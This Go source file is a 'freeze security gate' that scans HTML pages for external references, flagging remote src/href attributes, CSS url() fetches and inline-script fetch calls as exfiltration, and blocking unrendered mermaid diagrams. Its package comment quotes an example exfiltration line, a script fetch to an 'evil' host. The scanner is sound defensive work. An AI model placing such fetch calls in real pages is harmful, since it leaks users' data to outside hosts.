// Package gate is the freeze security gate (covenant IV): a frozen page must
// reference nothing external — no CDN, no remote font/script/img, no phone-home.
//
// Two passes, each tuned so prose stays clean and real exfil is caught:
//
//	1. ATTRIBUTE/CSS pass (reDep): flags src=/href= attributes whose quoted
//	   value is absolute (https?:) or root-relative (/), and CSS url(https://…)
//	   references (a remote font/image phones home too). The url() branch
//	   requires the scheme's `//` so authored PROSE that merely documents the
//	   pattern — e.g. "…href=// / url(https:)." in the security-gate page — is
//	   NOT a leak. d2's inline SVG (xmlns="http://www.w3.org/…", xlink:href="#id",
//	   url(#gradient)) passes: not src/href values, not url(https://).
//
//	2. INLINE-SCRIPT pass (reInlineHTTP): a frozen page may carry inline scripts,
//	   and an inline `<script>fetch('https://evil')</script>` would slip past
//	   pass 1 entirely — a real hole in the "exfiltration-proof" covenant the
//	   binary is sold on. So inside <script>…</script> blocks we flag an http(s)
//	   URL used as a VALUE (preceded by a quote, '=', '(' or backtick — the
//	   shape of fetch()/.src=/location= exfil), excluding www.w3.org (the SVG
//	   namespace, legitimately used via createElementNS in JS). A URL surrounded
//	   by whitespace (a license banner, e.g. the inlined svg-pan-zoom kit's
//	   `* https://github.com/…`) is NOT value-shaped, so vendored comments stay
//	   clean. Prose OUTSIDE scripts is never touched by this pass.
package gate

import (
	"fmt"
	"regexp"
	"sort"
	"strings"
)

var (
	// reDep: an external/root reference in a src=/href= attribute, or a CSS
	// url(https://…) — a remote font/image via url() phones home too. The url()
	// branch requires `//` so prose `url(https:)` is not a leak.
	reDep     = regexp.MustCompile(`(?i)(?:src|href)\s*=\s*['"](?:/|https?:)|url\(\s*['"]?https?://`)
	reMermaid = regexp.MustCompile(`(?i)<div\s+class=['"]mermaid['"]\s*>`)
	// reScript isolates inline <script>…</script> bodies for the exfil pass.
	reScript = regexp.MustCompile(`(?is)<script\b[^>]*>(.*?)</script>`)
	// reInlineHTTP: an http(s) URL used as a value inside a script — preceded by
	// a quote, '=', '(' or backtick. Captures the URL (group 1) for naming.
	reInlineHTTP = regexp.MustCompile("(?i)['\"`=(]\\s*(https?://[a-z0-9.\\-]+)")
	// reW3 whitelists the W3C namespace authority (SVG/xlink identifiers, never
	// network-fetched), scoped tightly so any other host still leaks.
	reW3 = regexp.MustCompile(`(?i)^https?://www\.w3\.org(/|$)`)
)

// Scan returns the external-reference substrings found in html (empty == clean).
// Pass 1 is the attribute/CSS detector; pass 2 catches value-shaped http(s)
// URLs inside inline <script> blocks (inline-exfil), excluding www.w3.org.
func Scan(html string) []string {
	if html == "" {
		return nil
	}
	leaks := reDep.FindAllString(html, -1)
	for _, sm := range reScript.FindAllStringSubmatch(html, -1) {
		for _, m := range reInlineHTTP.FindAllStringSubmatch(sm[1], -1) {
			if !reW3.MatchString(m[1]) {
				leaks = append(leaks, m[1])
			}
		}
	}
	return leaks
}

// HasMermaid reports whether html still carries a live (un-baked) mermaid source
// div — which cannot be frozen in-process (no mmdc), so freeze must refuse it.
func HasMermaid(html string) bool {
	return reMermaid.MatchString(html)
}

// Enforce scans each (name, html) pair. Returns an error naming every offender
// (external refs or un-freezable mermaid), or nil if all clean.
func Enforce(pages map[string]string) error {
	var offenders []string
	for name, html := range pages {
		var reasons []string
		if leaks := Scan(html); len(leaks) > 0 {
			reasons = append(reasons, "external refs "+fmt.Sprint(uniqueSorted(leaks)))
		}
		if HasMermaid(html) {
			reasons = append(reasons, "un-freezable mermaid diagram (no in-process renderer — route through d2)")
		}
		if len(reasons) > 0 {
			offenders = append(offenders, name+": "+strings.Join(reasons, "; "))
		}
	}
	if len(offenders) > 0 {
		sort.Strings(offenders)
		return fmt.Errorf("freeze blocked — %d page(s) not self-contained:\n  %s",
			len(offenders), strings.Join(offenders, "\n  "))
	}
	return nil
}

func uniqueSorted(xs []string) []string {
	seen := map[string]bool{}
	var out []string
	for _, x := range xs {
		if !seen[x] {
			seen[x] = true
			out = append(out, x)
		}
	}
	sort.Strings(out)
	return out
}
